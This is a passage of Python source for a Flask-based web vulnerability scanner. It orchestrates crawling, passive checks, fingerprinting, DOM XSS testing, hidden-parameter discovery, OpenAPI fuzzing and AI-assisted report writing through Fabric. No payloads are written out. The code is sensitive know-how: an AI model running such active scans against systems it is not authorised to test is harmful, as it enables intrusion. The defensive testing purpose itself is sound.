                with _engine_lock:
                    _engine_fingerprint = fp
                    sitemap.tech = fp
                break
            except Exception:
                continue

        if _engine_stop_event.is_set():
            _engine_status_msg = "stopped"
            return

        # ── 4. Fuzz all surfaces ─────────────────────────────────────────────
        _engine_status_msg = "fuzzing OpenAPI surfaces"
        _engine_progress["phase"] = "fuzzing"

        # LLM provider for adaptive fuzzing (if API keys configured)
        _fuzz_llm = None
        if _api_keys.get("anthropic") or _api_keys.get("openai"):
            try:
                _fuzz_llm = LLMProvider(api_keys={
                    "anthropic": _api_keys.get("anthropic", ""),
                    "openai":    _api_keys.get("openai", ""),
                })
            except Exception:
                pass

        fuzzer = Fuzzer(
            scope        = scope,
            session      = session,
            timeout      = 10,
            rate_limit   = 0.05,
            max_surfaces = 700,
            stop_event   = _engine_stop_event,
            llm_provider = _fuzz_llm,
        )
        results = fuzzer.fuzz_all(sitemap.surfaces,
                                  on_payload_sent=lambda c: _engine_progress.update({"payloads_sent": c}))

        with _engine_lock:
            _engine_fuzz_results = [
                {k: v for k, v in r.__dict__.items()} for r in results
            ]
            _engine_progress["findings_count"] = len(results)
            _engine_progress["payloads_sent"]  = fuzzer._payloads_sent_count
            try:
                if _active_scan_id:
                    _db.record_metric(_active_scan_id, "fuzzing",
                                      payloads_sent=fuzzer._payloads_sent_count,
                                      findings_count=len(results))
            except Exception:
                pass

        for r in results:
            _frec = {
                "agent":        "Engine Fuzzer",
                "vuln_type":    r.vuln_type,
                "severity":     r.severity,
                "type":         r.vuln_type,
                "finding":      r.finding,
                "url":          r.url,
                "target":       r.url,
                "param":        r.param,
                "payload":      r.payload,
                "evidence_id":  r.evidence_id,
                "resp_time_ms": r.resp_time_ms,
                "proof":        r.proof,
                "proof_data":   r.proof_data,
                "status_code":  r.status_code,
            }
            with _lock:
                _findings.append(_frec)
            _persist_finding(_frec)

        # ── 5. VulnerabilityScanner — OWASP specialized checks ──────────────
        if not _engine_stop_event.is_set():
            _engine_status_msg = "running OWASP specialized checks on OpenAPI endpoints"
            _engine_progress["phase"] = "owasp_checks"

            def _on_scan_finding(sf):
                with _lock:
                    _findings.append({
                        "agent":            "DAST Scanner",
                        "agent_id":         "scanner",
                        "icon":             "⚙️",
                        "phase":            "Active Scanning",
                        "finding":          sf.finding,
                        "severity":         sf.severity,
                        "target":           sf.url,
                        "url":              sf.url,
                        "param":            sf.param,
                        "payload":          sf.payload,
                        "type":             sf.vuln_type,
                        "owasp":            sf.owasp_category,
                        "cwe":              sf.cwe,
                        "remediation":      sf.remediation,
                        "proof":            sf.proof,
                        "chain_id":         sf.chain_id,
                        "chain_desc":       sf.chain_desc,
                        "evidence_id":      sf.evidence_id,
                        "resp_time_ms":     sf.resp_time_ms,
                        "status_code":      sf.status_code,
                        "confidence_level": sf.confidence_level.value,
                        "ts":               sf.ts,
                    })

            scanner = VulnerabilityScanner(
                target     = target,
                scope      = scope,
                session    = session,
                ev_store   = _ev_store,
                stop_event = _engine_stop_event,
                on_finding = _on_scan_finding,
                timeout    = 10,
                rate_limit = 0.05,
                scan_id    = _active_scan_id or "",
            )
            scan_findings = scanner.scan(sitemap)

            with _engine_lock:
                _engine_progress["findings_count"] = len(results) + len(scan_findings)

        _engine_status_msg = "complete"
        _engine_progress["phase"] = "complete"

    except Exception as exc:
        _engine_status_msg = f"error: {exc}"
        _engine_progress["phase"] = "error"
    finally:
        with _engine_lock:
            _engine_running = False


@app.route("/api/openapi/status")
@_login_required
def openapi_status():
    return jsonify({
        "imported":     bool(_openapi_state["imported_at"]),
        "title":        _openapi_state["title"],
        "version":      _openapi_state["version"],
        "spec_type":    _openapi_state["spec_type"],
        "base_url":     _openapi_state["base_url"],
        "endpoint_count": len(_openapi_endpoints),
        "imported_at":  _openapi_state["imported_at"],
        "source_url":   _openapi_state.get("source_url", ""),
    })


@app.route("/api/openapi/endpoints")
@_login_required
def openapi_endpoints_list():
    method_filter = req.args.get("method", "").upper()
    tag_filter    = req.args.get("tag", "")
    eps = _openapi_endpoints
    if method_filter:
        eps = [e for e in eps if e["method"] == method_filter]
    if tag_filter:
        eps = [e for e in eps if tag_filter in e.get("tags", [])]
    return jsonify({"endpoints": eps, "count": len(eps)})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  FABRIC INTEGRATION  (Daniel Miessler's Fabric AI pattern runner)
# ═══════════════════════════════════════════════════════════════════════════════
#
# Fabric patterns most valuable for DAST:
#   create_report_finding    → raw finding → structured pentest-style report
#   improve_report_finding   → polish + add remediation detail to a finding
#   write_hackerone_report   → finding → ready-to-submit bug bounty report
#   create_cyber_summary     → all findings → executive summary
#   create_threat_scenarios  → findings → attack chain narrative
#   create_stride_threat_model → target → STRIDE model
#   analyze_threat_report    → full report → deep threat analysis
#   analyze_risk             → findings → risk assessment
# ──────────────────────────────────────────────────────────────────────────────

import shutil as _sh2

_FABRIC_BIN      = _sh2.which("fabric")
_FABRIC_AVAILABLE = bool(_FABRIC_BIN)

# Curated patterns relevant to DAST (shown in UI pattern picker)
_FABRIC_DAST_PATTERNS = [
    {"id": "create_report_finding",    "label": "📝 Create Report Finding",
     "desc": "Raw finding → structured pentest-style vuln report"},
    {"id": "improve_report_finding",   "label": "✨ Improve Finding",
     "desc": "Polish & enrich an existing finding with remediation steps"},
    {"id": "write_hackerone_report",   "label": "🐛 HackerOne Report",
     "desc": "Convert finding to a ready-to-submit bug bounty report"},
    {"id": "create_cyber_summary",     "label": "📊 Cyber Summary",
     "desc": "All findings → executive / management summary"},
    {"id": "create_threat_scenarios",  "label": "⚔️ Threat Scenarios",
     "desc": "Generate attack chain narratives from findings"},
    {"id": "create_stride_threat_model","label": "🛡 STRIDE Model",
     "desc": "Build STRIDE threat model from target description"},
    {"id": "analyze_threat_report",    "label": "🔍 Analyze Threat Report",
     "desc": "Deep threat intelligence analysis of scan output"},
    {"id": "analyze_risk",             "label": "⚠️ Risk Assessment",
     "desc": "Risk analysis of discovered vulnerabilities"},
    {"id": "extract_poc",              "label": "💥 Extract PoC",
     "desc": "Extract proof-of-concept steps from finding text"},
    {"id": "analyze_logs",             "label": "📋 Analyze Logs",
     "desc": "Analyse raw agent/proxy output logs for patterns"},
]


def _run_fabric(pattern: str, input_text: str, timeout: int = 60) -> dict:
    """Run `echo input | fabric -p pattern` and return output."""
    if not _FABRIC_AVAILABLE:
        return {"error": "fabric not found in PATH — install from github.com/danielmiessler/fabric"}
    if not pattern or not input_text.strip():
        return {"error": "pattern and input_text are required"}
    try:
        result = subprocess.run(
            [_FABRIC_BIN, "-p", pattern],
            input=input_text,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        if result.returncode != 0:
            err = result.stderr.strip() or f"fabric exited with code {result.returncode}"
            return {"error": err}
        return {"output": result.stdout.strip(), "pattern": pattern}
    except subprocess.TimeoutExpired:
        return {"error": f"fabric timed out after {timeout}s"}
    except Exception as e:
        return {"error": str(e)}


def _format_finding_for_fabric(finding: dict) -> str:
    """Serialise a DAST finding into readable text for Fabric input."""
    lines = [
        f"Vulnerability: {finding.get('finding', '')}",
        f"Severity: {finding.get('severity', 'medium').upper()}",
        f"Agent: {finding.get('agent', '')}",
        f"Phase: {finding.get('phase', '')}",
        f"Target: {finding.get('target', '')}",
    ]
    if finding.get("ts"):
        lines.append(f"Discovered: {finding['ts']}")
    return "\n".join(lines)


@app.route("/api/fabric/patterns")
@_login_required
def fabric_patterns():
    return jsonify({
        "available": _FABRIC_AVAILABLE,
        "patterns":  _FABRIC_DAST_PATTERNS,
    })


@app.route("/api/fabric/run", methods=["POST"])
@_login_required
def fabric_run():
    """Generic Fabric pattern runner — POST {pattern, input}."""
    data    = req.get_json(silent=True) or {}
    pattern = data.get("pattern", "").strip()
    text    = data.get("input",   "").strip()
    timeout = int(data.get("timeout", 60))
    if not pattern:
        return jsonify({"error": "pattern is required"}), 400
    if not text:
        return jsonify({"error": "input is required"}), 400
    result = _run_fabric(pattern, text, timeout)
    if "error" in result:
        return jsonify(result), 500
    return jsonify(result)


@app.route("/api/fabric/finding/<int:idx>", methods=["POST"])
@_login_required
def fabric_finding(idx: int):
    """Run a Fabric pattern on a single finding by index."""
    data    = req.get_json(silent=True) or {}
    pattern = data.get("pattern", "create_report_finding")
    with _lock:
        findings = list(_findings)
    if idx < 0 or idx >= len(findings):
        return jsonify({"error": f"Finding index {idx} out of range"}), 404
    text   = _format_finding_for_fabric(findings[idx])
    result = _run_fabric(pattern, text)
    if "error" in result:
        return jsonify(result), 500
    return jsonify({**result, "finding_index": idx, "finding": findings[idx]})


@app.route("/api/fabric/summary", methods=["POST"])
@_login_required
def fabric_summary():
    """Run create_cyber_summary (or chosen pattern) on ALL current findings."""
    data    = req.get_json(silent=True) or {}
    pattern = data.get("pattern", "create_cyber_summary")
    with _lock:
        findings = list(_findings)
    if not findings:
        return jsonify({"error": "No findings to summarise — run a scan first"}), 400

    # Build a comprehensive input: target + all findings
    lines = [f"Target: {_scan_target or 'unknown'}", "",
             f"Total findings: {len(findings)}", ""]
    for i, f in enumerate(findings, 1):
        lines.append(f"--- Finding {i} ---")
        lines.append(_format_finding_for_fabric(f))
        lines.append("")

    result = _run_fabric(pattern, "\n".join(lines), timeout=120)
    if "error" in result:
        return jsonify(result), 500
    return jsonify({**result, "findings_processed": len(findings)})


# ═══════════════════════════════════════════════════════════════════════════════
# ██  REAL DAST ENGINE  — Crawler + Fuzzer + Auth + Evidence + Fingerprint
# ═══════════════════════════════════════════════════════════════════════════════

# Engine state (one session at a time)
_engine_lock          = threading.Lock()
_engine_auth_handler: Optional["AuthHandler"]   = None   # type: ignore
_engine_macro_script: Optional[str]             = None   # path to macro JSON
_engine_cookie_rules: list                      = []     # CookieJarRules rules
_engine_sitemap:      Optional["SiteMap"]        = None   # type: ignore
_engine_fuzz_results: list                       = []
_engine_fingerprint:  dict                       = {}
_engine_running:      bool                       = False
_engine_stop_event:   threading.Event            = threading.Event()
_engine_thread:       Optional[threading.Thread] = None
_engine_status_msg:   str                        = "idle"
_engine_progress:     dict                       = {
    "phase": "idle",
    "pages_crawled":  0,
    "surfaces_found": 0,
    "payloads_sent":  0,
    "findings_count": 0,
    "passive_count":  0,
    "browse_count":   0,
    "detected_url":   None,   # set when engine auto-discovers a different port
    "external_tools": [],
    "external_status": "",
    "nuclei_folder": "",
    "nuclei_folders_done": 0,
    "nuclei_folders_total": 0,
    "current_tool": "",
    "race_findings":    0,
    "race_tested":      0,
    "race_total":       0,
    "race_current_url": "",
    "coverage_checks":  ["COV-REGISTRY-001"],
}

# Persistent last-scan record — never reset, survives new scan launches
# Extra module state
_passive_findings:    list = []    # PassiveFinding dicts from passive scanner
_browse_results:      list = []    # BrowseResult dicts from forced browse
_browse_running:      bool = False
_browse_status:       str  = "idle"   # "idle" | "running" | "complete — N results" | "error: ..."
_browse_wordlist_total: int = 0
_browse_wordlist_label: str = ""
_browse_stop_event:   threading.Event = threading.Event()
_browse_thread:       Optional[threading.Thread] = None
_gobuster_running:    bool = False
_gobuster_status:     str  = "idle"   # "idle" | "running" | "complete — N paths" | "error: ..."
_gobuster_findings:   list = []
_gobuster_stop_event: threading.Event = threading.Event()
_gobuster_thread:     Optional[threading.Thread] = None
_ajax_running:        bool = False
_ajax_status:         str  = "idle"   # "idle" | "running" | "complete — N urls" | "error: ..."
_ajax_urls_found:     int  = 0
_ajax_pages:          list = []   # [{url, status, content_type, source}] from last AJAX crawl
_ajax_stop_event:     threading.Event = threading.Event()
_ajax_thread:         Optional[threading.Thread] = None
_openapi_surfaces:    list = []    # InputSurface dicts from OpenAPI import
_activity_log:        list = []    # Scan activity events {ts, event, target, detail}
_ACTIVITY_MAX        = 300         # Keep last N events


def _engine_scan_worker(target: str, config: dict):
    """Background thread: crawl → passive scan → fingerprint → fuzz."""
    global _engine_sitemap, _engine_fuzz_results, _engine_fingerprint
    global _engine_running, _engine_status_msg, _engine_progress
    global _passive_findings

    import datetime as _dt_eng
    def _elog(msg: str):
        ts = _dt_eng.datetime.now().strftime("%H:%M:%S")
        print(f"[ENGINE {ts}] {msg}", flush=True)
        log.info("[Engine] %s", msg)

    # Phase gate helper — when a profile specifies phases_enabled, skip others
    _phases_enabled = config.get("phases_enabled")
    def _phase_ok(name: str) -> bool:
        return _phases_enabled is None or name in _phases_enabled

    try:
        # ── 0. Setup ──────────────────────────────────────────────────────────
        if not _ENGINE_AVAILABLE:
            _engine_status_msg = "error: engine modules not loaded"
            return

        scope   = ScopeManager(target)
        session = _engine_auth_handler.session if _engine_auth_handler else None

        import requests as _req_lib
        from requests.adapters import HTTPAdapter
        from urllib3.util.retry import Retry
        if session is None:
            if config.get("use_headless_browser"):
                try:
                    from modules.browser_session import BrowserSession
                    session = BrowserSession()
                    session.verify = False
                    log.info("[Engine] Headless browser session active (Playwright/Chromium)")
                except Exception as _bs_exc:
                    log.warning("[Engine] Could not start BrowserSession (%s) — falling back to requests", _bs_exc)
                    session = None
            if session is None:
                session = PassiveInterceptSession()
                session.verify = False
                session.headers["User-Agent"] = "Mozilla/5.0 (DAST-Engine/2.0)"
                # Retry on connection-level errors (helps with raw IPs and non-standard stacks)
                _retry = Retry(total=2, connect=2, read=2, backoff_factor=0.3,
                               status_forcelist=[500, 502, 503, 504],
                               allowed_methods=["HEAD", "GET", "OPTIONS"])
                _adapter = HTTPAdapter(max_retries=_retry)
                session.mount("http://", _adapter)
                session.mount("https://", _adapter)

        # ── Auto re-auth on 401 during long scans ──
        if _engine_auth_handler:
            try:
                ReAuthSession(session, _engine_auth_handler)
            except Exception as _reauth_exc:
                log.debug("[Engine] ReAuthSession wiring error: %s", _reauth_exc)
        # ── Macro-based re-auth (multi-step login replay on 401) ──
        if _engine_macro_script:
            try:
                MacroReAuthSession(session, _engine_macro_script)
            except Exception as _macro_exc:
                log.debug("[Engine] MacroReAuthSession wiring error: %s", _macro_exc)
        # ── Proactive session refresh (refresh before expiry, not just on 401) ──
        # Only activate when credentials can be replayed (not static cookie/header imports)
        _replayable_auth_types = {"token", "form", "browser", "script"}
        _auth_type = getattr(_engine_auth_handler, "auth_type", "") if _engine_auth_handler else ""
        _has_stored = bool(getattr(_engine_auth_handler, "_stored_auth", None)) if _engine_auth_handler else False
        if _engine_auth_handler and (_has_stored or _auth_type in _replayable_auth_types):
            try:
                _proactive_reauth = ProactiveReAuthSession(
                    session, _engine_auth_handler,
                    refresh_interval=300, refresh_every_n=100,
                )
                log.info("[Engine] Proactive session refresh enabled (auth_type=%s)", _auth_type)
            except Exception as _pra_exc:
                log.debug("[Engine] ProactiveReAuthSession wiring error: %s", _pra_exc)
        elif _engine_auth_handler:
            log.info("[Engine] Proactive session refresh skipped — static credentials (auth_type=%s)", _auth_type)
        # ── Cookie jar rules (filter/transform outbound cookies) ──
        if _engine_cookie_rules:
            try:
                CookieJarRules(session, _engine_cookie_rules)
            except Exception as _cjr_exc:
                log.debug("[Engine] CookieJarRules wiring error: %s", _cjr_exc)

        # ── 0.5 Preflight — verify target responds; auto-detect port if not ──
        _engine_status_msg = "probing target"
        _engine_progress["phase"] = "preflight"

        # Use shared probe helper — handles http→https upgrade, alt-port discovery
        _probe = _probe_target(target)
        if not _probe["reachable"]:
            # Warn but don't stop — probe uses short timeout; real crawl will surface errors
            log.warning("[Engine] Preflight probe failed for %s — proceeding anyway", target)
            _engine_status_msg = "warning: probe timed out — proceeding with scan"
        if _probe["port_changed"] or _probe["resolved"] != target:
            target = _probe["resolved"]
            scope  = ScopeManager(target)
            _engine_progress["detected_url"] = target

        # ── 1. Crawl + baseline + ID harvesting ────────────────────────────
        # Initialize baseline and ID harvester
        _baseline = EndpointBaseline() if _HAS_BASELINE else None
        _id_harvester = ObjectIDHarvester() if _HAS_ID_HARVESTER else None

        if _phase_ok("crawl"):
            _elog(f"PHASE crawl START — target={target}")
            _engine_status_msg = "crawling"
            _engine_progress["phase"] = "crawling"

            def _crawl_cb(url: str, status: int):
                with _engine_lock:
                    _engine_progress["pages_crawled"] += 1
                    _engine_progress["current_url"] = url
                # Harvest IDs from every crawled URL
                if _id_harvester:
                    try:
                        _id_harvester.harvest_url(url)
                    except Exception as _harv_exc:
                        log.debug("[Engine] ID harvest failed for %s: %s", url, _harv_exc)

            # ── Auth callback: re-auth on logout detection during crawl ──
            def _crawl_reauth_cb():
                if _engine_auth_handler:
                    try:
                        _engine_auth_handler.re_authenticate()
                        _engine_auth_handler.transfer_cookies_to(session)
                    except Exception as _ra_exc:
                        log.debug("[Engine] Crawl re-auth failed: %s", _ra_exc)
                if _engine_macro_script:
                    try:
                        MacroReAuthSession(session, _engine_macro_script)
                    except Exception:
                        pass

            _crawl_max_pages = config.get("max_pages", 200)
            _engine_progress["max_pages"] = _crawl_max_pages
            crawler = Crawler(
                target        = target,
                scope         = scope,
                session       = session,
                max_pages     = _crawl_max_pages,
                max_depth     = config.get("max_depth", 5),
                timeout       = config.get("timeout", 10),
                delay         = config.get("delay", 0.05),
                callback      = _crawl_cb,
                auth_callback = _crawl_reauth_cb if _engine_auth_handler else None,
            )
            sitemap = crawler.crawl()
            _elog(f"PHASE crawl DONE — {len(sitemap.pages)} pages, {len(sitemap.surfaces)} surfaces")
        else:
            # No crawl — create empty sitemap (e.g. api-only profile)
            sitemap = SiteMap()

        if _engine_stop_event.is_set():
            _engine_status_msg = "stopped"
            return

        with _engine_lock:
            _engine_sitemap = sitemap
            _engine_progress["surfaces_found"] = len(sitemap.surfaces)
            _engine_progress.setdefault("coverage_checks", []).append("RESUME-STATE-001")
        try:
            if _active_scan_id:
                _surface_ids = []
                for _s in getattr(sitemap, "surfaces", []):
                    _surface_ids.append(
                        getattr(_s, "url", None)
                        or (str(_s.get("url", "")) if isinstance(_s, dict) else str(_s))
                    )
                if _surface_ids:
                    _RESUMABLE_SCAN_STORE.start_scan(_active_scan_id, target, _surface_ids)
        except Exception as _resume_exc:
            log.debug("[Assurance] resume state init failed: %s", _resume_exc)
        try:
            if _active_scan_id:
                _db.record_metric(_active_scan_id, "crawling",
                                  pages_crawled=_engine_progress.get("pages_crawled", 0),
                                  surfaces_found=len(sitemap.surfaces))
                # Persist crawled pages as baseline raw_requests
                crawler_rows = []
                _crawl_pages_snap = list(sitemap.pages.items())
                for page_url, page_info in _crawl_pages_snap:
                    if not page_url:
                        continue
                    crawler_rows.append({
                        "scan_id":    _active_scan_id,
                        "source":     "crawler",
                        "url":        page_url,
                        "method":     "GET",
                        "status_code": page_info.get("status", 0) if isinstance(page_info, dict) else 0,
                        "is_baseline": True,
                    })
                if crawler_rows:
                    _db.bulk_store_raw_requests(crawler_rows)
        except Exception:
            pass

        # ── 1.5 Passive scan every crawled page ───────────────────────────────
        p_count = 0
        if _ENGINE_AVAILABLE and _phase_ok("passive"):
            _elog(f"PHASE passive START — {len(sitemap.pages)} pages to scan")
            _engine_status_msg = "passive scanning"
            _engine_progress["phase"] = "passive"
            try:
                _passive_pages = list(sitemap.pages.items())
            except RuntimeError:
                _passive_pages = list(dict(sitemap.pages).items())
            _passive_total = len(_passive_pages)
            _passive_done  = 0
            _engine_progress["passive_total"] = _passive_total
            _engine_progress["passive_done"]  = 0
            for page_url, page_info in _passive_pages:
                if _engine_stop_event.is_set():
                    break
                _passive_done += 1
                _engine_progress["passive_done"] = _passive_done
                _engine_progress["passive_pct"]  = int((_passive_done / max(_passive_total, 1)) * 100)
                if _passive_done % 10 == 0 or _passive_done == _passive_total:
                    _elog(f"PHASE passive {_passive_done}/{_passive_total} pages scanned")
                try:
                    resp = session.get(page_url, timeout=10)
                    pf   = _passive.scan(
                        url             = page_url,
                        status_code     = resp.status_code,
                        resp_headers    = dict(resp.headers),
                        resp_body       = resp.text[:8000],
                        cookies         = {c.name: c.value for c in session.cookies},
                        request_headers = dict(session.headers),
                    )
                    for f in pf:
                        d = f.to_dict()
                        with _engine_lock:
                            _passive_findings.append(d)
                            p_count += 1
                            _engine_progress["passive_count"] = p_count
                    try:
                        _browser_findings = _BROWSER_SECURITY_ANALYZER.analyze(
                            url=page_url,
                            html=resp.text[:12000],
                            headers=dict(resp.headers),
                        )
                        if _browser_findings:
                            with _lock:
                                _findings.extend(_browser_findings)
                            for _bf in _browser_findings:
                                _persist_finding(_bf)
                        with _engine_lock:
                            _engine_progress.setdefault("coverage_checks", []).append("BROWSER-CLIENT-001")
                    except Exception as _browser_exc:
                        log.debug("[Assurance] browser security analysis failed: %s", _browser_exc)

                    # ── Baseline capture ──
                    if _baseline:
                        _baseline.record(page_url, resp.status_code,
                                         len(resp.text), resp.elapsed.total_seconds() * 1000)

                    # ── Nuclei extended passive checks ──
                    _resp_body = resp.text[:8000]
                    _resp_hdrs = dict(resp.headers)
                    _resp_cookies = {c.name: c.value for c in session.cookies}

                    for _check_fn, _has_flag, _agent_name in [
                        (nuclei_dast_checks if _HAS_NUCLEI_DAST else None, _HAS_NUCLEI_DAST, "Nuclei DAST"),
                        (nuclei_exposure_checks if _HAS_NUCLEI_EXPOSURES else None, _HAS_NUCLEI_EXPOSURES, "Nuclei Exposures"),
                        (nuclei_misconfig_checks if _HAS_NUCLEI_MISCONFIG else None, _HAS_NUCLEI_MISCONFIG, "Nuclei Misconfig"),
                        (nuclei_token_checks if _HAS_NUCLEI_TOKENS else None, _HAS_NUCLEI_TOKENS, "Nuclei Tokens"),
                    ]:
                        if _check_fn and _has_flag:
                            try:
                                _nf = _check_fn(page_url, _resp_body, _resp_hdrs, _resp_cookies)
                                for nf in _nf:
                                    with _lock:
                                        _findings.append({
                                            "agent":    _agent_name,
                                            "severity": nf.get("severity", "Info"),
                                            "type":     nf.get("category", "nuclei"),
                                            "finding":  nf.get("finding", ""),
                                            "url":      page_url,
                                            "cwe":      nf.get("cwe", ""),
                                            "remediation": nf.get("remediation", ""),
                                        })
                            except Exception:
                                pass

                    # ── JS library vulnerability scan ──
                    if _HAS_JS_SCANNER:
                        try:
                            _jsf = scan_js_libraries(page_url, _resp_body, _resp_hdrs, _resp_cookies)
                            for jf in _jsf:
                                with _lock:
                                    _findings.append({
                                        "agent":    "JS Library Scanner",
                                        "severity": jf.get("severity", "Medium"),
                                        "type":     jf.get("category", "vulnerable_library"),
                                        "finding":  jf.get("finding", ""),
                                        "url":      page_url,
                                        "cwe":      jf.get("cwe", ""),
                                    })
                        except Exception:
                            pass

                except Exception:
                    pass

        # ── 2. Fingerprint (first page) ───────────────────────────────────────
        if _phase_ok("fingerprint") and sitemap.pages:
            _elog("PHASE fingerprint START")
            _engine_status_msg = "fingerprinting"
            _engine_progress["phase"] = "fingerprinting"
            first = next(iter(sitemap.pages.values()), None)
            if first:
                try:
                    fp_resp = session.get(first["url"], timeout=10)
                    fp = fingerprint(
                        url          = first["url"],
                        status_code  = fp_resp.status_code,
                        resp_headers = dict(fp_resp.headers),
                        resp_body    = fp_resp.text[:8000],
                        cookies      = {c.name: c.value for c in session.cookies},
                    )
                    with _engine_lock:
                        _engine_fingerprint = fp
                        sitemap.tech = fp
                except Exception:
                    pass

        # ── TLS / Certificate Analysis ──────────────────────────────────────
        if _phase_ok("fingerprint") and target.startswith("https://"):
            try:
                tls_scanner = TLSAnalyzer()
                tls_findings = tls_scanner.scan(target)
                for tf in tls_findings:
                    with _lock:
                        _findings.append({
                            "agent":       "TLS Analyzer",
                            "severity":    tf.severity,
                            "type":        getattr(tf, "vuln_type", "tls_issue"),
                            "finding":     tf.finding,
                            "url":         target,
                            "cwe":         getattr(tf, "cwe", "CWE-326"),
                            "remediation": getattr(tf, "remediation", ""),
                        })
                with _engine_lock:
                    _engine_progress["tls_findings"] = len(tls_findings)
                log.info("[Engine] TLS Analyzer: %d findings", len(tls_findings))
            except Exception as _tls_exc:
                log.debug("[Engine] TLS Analyzer error: %s", _tls_exc)

        # ── A02 Crypto Failures Scanner ──────────────────────────────────────
        if _HAS_CRYPTO_SCANNER and _phase_ok("fingerprint") and not _engine_stop_event.is_set():
            try:
                crypto_scanner = CryptoScanner(
                    target=target,
                    session=session,
                    timeout=config.get("timeout", 10),
                    stop_event=_engine_stop_event,
                )
                crypto_findings = crypto_scanner.scan(sitemap=sitemap)
                for cf in crypto_findings:
                    with _lock:
                        _findings.append({
                            "agent":       cf.get("agent", "Crypto Scanner"),
                            "severity":    cf.get("severity", "medium"),
                            "type":        cf.get("type", "crypto_issue"),
                            "finding":     cf.get("finding", ""),
                            "url":         cf.get("url", target),
                            "cwe":         cf.get("cwe", "CWE-310"),
                            "evidence":    cf.get("evidence", ""),
                            "remediation": cf.get("remediation", ""),
                        })
                with _engine_lock:
                    _engine_progress["crypto_findings"] = len(crypto_findings)
                if crypto_findings:
                    log.info("[Engine] Crypto Scanner: %d findings", len(crypto_findings))
            except Exception as _crypto_exc:
                log.debug("[Engine] Crypto Scanner error: %s", _crypto_exc)

        if _engine_stop_event.is_set():
            _engine_status_msg = "stopped"
            return

        _js_api_route_urls: list = []

        # ── 2.5 API Discovery + DOM XSS + Token Analysis ────────────────────
        if not _engine_stop_event.is_set() and _phase_ok("deep_discovery"):
            _elog(f"PHASE deep_discovery START — {len(sitemap.pages)} pages, {len(sitemap.surfaces)} surfaces")
            _engine_status_msg = "deep discovery & active testing"
            _engine_progress["phase"] = "deep_discovery"

            # ── API route discovery from JS files ──
            if _HAS_API_DISCOVERY:
                try:
                    api_discoverer = ApiRouteDiscoverer(base_url=target, session=session)
                    js_urls = [u for u in sitemap.pages if u.endswith(('.js', '.mjs'))]
                    # Also discover from page bodies
                    for page_url, page_info in list(sitemap.pages.items())[:50]:
                        if _engine_stop_event.is_set():
                            break
                        try:
                            resp = session.get(page_url, timeout=10)
                            api_discoverer.discover_from_page_body(resp.text, page_url)
                        except Exception:
                            pass
                    # discover_from_js_urls skips URLs already fetched by discover_from_page_body
                    discovered = api_discoverer.discover_from_js_urls(js_urls[:20]) if js_urls else []
                    # Convert discovered routes to surfaces for fuzzing
                    from modules.crawler import InputSurface
                    for route in discovered:
                        if _engine_stop_event.is_set():
                            break
                        try:
                            full_url = route.url if route.url.startswith("http") else target.rstrip("/") + "/" + route.url.lstrip("/")
                            sitemap.add_surface(InputSurface(
                                url=full_url, method=route.method or "GET",
                                param="", param_type="path", original_value="",
                            ))
                        except Exception:
                            pass
                    _js_api_route_urls = [
                        r.url if r.url.startswith("http") else target.rstrip("/") + "/" + r.url.lstrip("/")
                        for r in discovered
                    ]
                    with _engine_lock:
                        _engine_progress["api_routes_discovered"] = len(discovered)
                except Exception as e:
                    log.debug("[Engine] API discovery error: %s", e)

            # ── Source-code / JS endpoint discovery ──────────────────────────
            if _HAS_SOURCE_DISCOVERY and not _engine_stop_event.is_set() and _phase_ok("source_discovery"):
                _elog("PHASE source_discovery START")
                _engine_status_msg = "scanning source code"
                _engine_progress["phase"] = "source_discovery"
                _sd_total = 0
                _sd_timeout = config.get("timeout", 10)
                try:
                    from modules.crawler import InputSurface as _IS_sd
                    _src_path = config.get("source_path")
                    if _src_path:
                        _sd = _SourceDiscovery(base_url=target)
                        _sd.discover(_src_path)
                        for _sd_surf in _sd.to_input_surfaces(target):
                            sitemap.add_surface(_sd_surf)
                            _sd_total += 1

                    _js_keys = [u for u in sitemap.pages if u.endswith(('.js', '.mjs'))]
                    _sd_base = target.rstrip("/") + "/"
                    for _js_url in _js_keys[:20]:
                        if _engine_stop_event.is_set():
                            break
                        try:
                            _js_resp = session.get(_js_url, timeout=_sd_timeout)
                            _wp_paths = _extract_webpack_eps(_js_resp.text)
                            for _wp_path in _wp_paths:
                                sitemap.add_surface(_IS_sd(
                                    url=urljoin(_sd_base, _wp_path.lstrip("/")),
                                    method="GET", param="", param_type="path", original_value="",
                                ))
                                _sd_total += 1
                        except Exception:
                            pass

                    with _engine_lock:
                        _engine_progress["source_discovery_endpoints"] = _sd_total
                    if _sd_total:
                        log.info("[Engine] Source discovery: %d endpoints added", _sd_total)
                except Exception as _sd_err:
                    log.debug("[Engine] Source discovery error: %s", _sd_err)

            # ── DOM XSS Active Testing ──
            if _HAS_DOM_XSS and not _engine_stop_event.is_set():
                try:
                    dom_scanner = DomXssActiveScanner(
                        session=session, scope=scope,
                        timeout=config.get("timeout", 10),
                        rate_limit=config.get("delay", 0.05),
                    )
                    dom_findings = dom_scanner.scan(target, sitemap)
                    for df in dom_findings:
                        with _lock:
                            _findings.append({
                                "agent":    "DOM XSS Scanner",
                                "severity": df.severity,
                                "type":     "dom_xss",
                                "finding":  df.finding,
                                "url":      df.url,
                                "param":    df.param,
                                "payload":  df.payload,
                            })
                    with _engine_lock:
                        _engine_progress["dom_xss_findings"] = len(dom_findings)
                except Exception as e:
                    log.debug("[Engine] DOM XSS error: %s", e)

            # ── Parameter Digger — hidden/undocumented params ──
            if not _engine_stop_event.is_set():
                try:
                    digger = ParamDigger(delay=config.get("delay", 0.05))
                    dig_targets = list({s.url for s in sitemap.surfaces[:30]})
                    all_dig_results: list = []
                    for dig_url in dig_targets[:20]:
                        try:
                            dr = digger.run(session=session, url=dig_url)
                            all_dig_results.extend(dr)
                        except Exception:
                            pass
                    from modules.crawler import InputSurface as _IS
                    for dr in all_dig_results:
                        sitemap.add_surface(_IS(
                            url=dr.url, method=dr.method or "GET",
                            param=dr.param_name, param_type="query",
                            original_value=dr.injected_value,
                        ))
                    with _engine_lock:
                        _engine_progress["hidden_params_found"] = len(all_dig_results)
                    if all_dig_results:
                        log.info("[Engine] ParamDigger: %d hidden params found", len(all_dig_results))
                except Exception as _dig_exc:
                    log.debug("[Engine] ParamDigger error: %s", _dig_exc)

            # ── EXIF Scanner — sensitive metadata in image responses ──
            if not _engine_stop_event.is_set():
                try:
                    _image_urls = [
                        u for u in sitemap.pages
                        if any(u.lower().endswith(ext) for ext in
                               (".jpg", ".jpeg", ".pjpeg"))
                    ][:30]
                    if _image_urls:
                        _exif_scanner = ExifScanner()
